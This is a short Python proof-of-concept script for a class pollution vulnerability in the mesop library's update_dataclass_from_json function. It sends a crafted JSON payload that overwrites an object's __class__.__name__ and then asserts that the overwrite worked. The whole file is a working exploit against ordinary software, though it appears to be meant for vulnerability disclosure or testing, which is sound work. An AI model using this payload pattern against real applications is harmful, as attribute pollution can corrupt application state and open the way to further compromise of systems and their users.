# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: update_dataclass_from_json
# Type: get-both-set-both

from mesop.dataclass_utils.dataclass_utils import update_dataclass_from_json
from dataclasses import dataclass

@dataclass
class Target:
  dummy: str = "hello"

target = Target()

payload_value = "pwnd"
PAYLOAD = '{"__class__": {"__name__": "pwnd"}}'

def run_poc():
  update_dataclass_from_json(target, PAYLOAD)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
